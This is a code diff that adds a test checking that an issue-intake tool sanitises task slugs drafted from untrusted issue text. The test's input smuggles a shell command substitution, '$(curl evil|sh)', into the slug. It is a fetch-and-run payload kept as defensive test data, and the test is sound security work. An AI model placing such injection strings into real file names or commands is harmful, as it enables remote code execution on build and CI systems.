@@ -210,6 +210,30 @@ const TASK_VERDICT: IntakeVerdict = {
 };
 
 describe('intake <N> — the task-outcome dispatcher (stubbed seams)', () => {
+	it('sanitises a slug drafted from hostile issue content (shell metacharacters never reach the file name)', async () => {
+		// The slug is drafted from issue content; `paramCase` alone kept `$(`, `"`,
+		// `;` and `|`, which then flowed into the file name, the work branch and the
+		// CI matrix command line.
+		const {repo} = seedRepoWithArbiter(scratch.root, []);
+		const result = await performIntake({
+			issueNumber: 43,
+			cwd: repo,
+			arbiter: ARBITER,
+			issueProvider: stubIssueProvider(),
+			decide: async () => ({
+				...TASK_VERDICT,
+				taskSlug: 'Support $(curl evil|sh) "quoted"; ok',
+			}),
+			reviewTask: convergingReviewGate,
+			env: gitEnv(),
+		});
+		expect(result.outcome).toBe('tasked');
+		expect(result.emittedSlug).toBe('support-curl-evil-sh-quoted-ok');
+		expect(result.emitted).toBe(
+			'work/tasks/backlog/support-curl-evil-sh-quoted-ok.md',
+		);
+	});
+
 	it('a stubbed `task` verdict writes work/tasks/backlog/<slug>.md (default staging placement; issue: N, covers: [], no prd:, NO Fixes) and proposes a PR (main untouched)', async () => {
 		const {repo} = seedRepoWithArbiter(scratch.root, []);
 		const issueProvider = stubIssueProvider();
